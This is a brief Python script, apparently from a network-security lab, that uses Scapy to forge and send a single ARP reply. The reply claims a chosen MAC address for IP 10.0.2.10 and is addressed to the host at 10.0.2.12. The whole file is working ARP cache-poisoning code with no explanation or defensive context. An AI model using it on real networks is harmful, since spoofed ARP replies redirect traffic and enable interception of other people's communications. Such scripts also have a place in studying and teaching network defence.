from scapy.all import *

packet = ARP(op=2,
             hwsrc="00:0c:29:b7:8f:c6",
             psrc="10.0.2.10",
             hwdst="00:0c:29:33:31:2e",
             pdst="10.0.2.12")

send(packet)